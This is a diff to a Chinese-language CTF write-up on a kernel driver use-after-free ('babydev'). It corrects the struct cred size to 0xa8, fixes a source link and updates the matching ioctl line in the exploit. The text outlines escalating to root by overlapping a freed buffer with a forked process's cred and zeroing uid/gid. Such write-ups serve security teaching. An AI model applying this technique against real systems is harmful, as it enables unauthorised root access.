@@ -178,7 +178,7 @@ int __fastcall babyrelease(inode *inode, file *filp)
 
 那么有了 UAF 要怎么用呢？之前提到了 cred 结构体，可以修改 cred 来提权到 root。
 
-其中 4.4.72 的 cred 结构体 [定义](/usr/src/linux-headers-4.15.0-29deepin/include/linux/compiler_types.h) 如下：
+其中 4.4.72 的 cred 结构体 [定义](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118) 如下：
 ```C
 struct cred {
 	atomic_t	usage;
@@ -227,7 +227,7 @@ struct cred {
 2. 释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠
 3. 同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root
 
-需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0x8a（注意使用相同内核版本的源码）。
+需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0xa8（注意使用相同内核版本的源码）。
 
 
 #### Exploit
@@ -250,7 +250,7 @@ int main()
 	int fd2 = open("/dev/babydev", 2);
 
 	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
-	ioctl(fd1, 0x10001, 0x8a);
+	ioctl(fd1, 0x10001, 0xa8);
 
 	// 释放 fd1
 	close(fd1);
